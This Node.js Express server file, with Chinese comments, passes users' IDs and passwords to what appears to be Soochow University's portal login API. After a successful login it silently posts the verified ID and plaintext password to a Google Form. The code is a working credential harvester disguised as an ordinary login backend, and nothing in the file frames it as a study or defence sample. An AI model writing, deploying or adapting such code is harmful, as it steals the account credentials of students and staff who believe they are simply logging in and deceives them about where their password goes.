// server.js
require('dotenv').config();
const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());

// 後端 API 路由
app.post('/api/login', async (req, res) => {
  const { userid, password } = req.body;
  if (!userid || !password) {
    return res.status(400).json({ status: 'fail', message: '請輸入帳號密碼' });
  }

  // 學校登入 API
  const loginUrl = "https://psv.scu.edu.tw/portal/jsonApi.php";
  const payload = new URLSearchParams({
    libName: "Login",
    userid,
    password
  }).toString();

  try {
    const response = await axios.post(loginUrl, payload, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0'
      }
    });

    const data = response.data;
    if (data.status === "success") {
      // 登入成功，送資料到 Google 表單
      const googleFormUrl = `https://docs.google.com/forms/d/e/${process.env.GOOGLE_FORM_ID}/formResponse`;

      // 假設你的 Google 表單欄位對應 entry.1234567890，請自行替換
      const formPayload = new URLSearchParams({
        'entry.1686433421': userid,
        'entry.77926306': password
      }).toString();

      try {
        await axios.post(googleFormUrl, formPayload, {
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });
      } catch (err) {
        console.error('寫入 Google 表單失敗', err.message);
        // 這裡可選擇忽略或回報錯誤
      }

      return res.json({ status: 'success', message: '登入成功' });
    } else {
      return res.status(401).json({ status: 'fail', message: '帳號或密碼錯誤' });
    }
  } catch (error) {
    console.error(error.message);
    return res.status(500).json({ status: 'fail', message: '後端錯誤' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
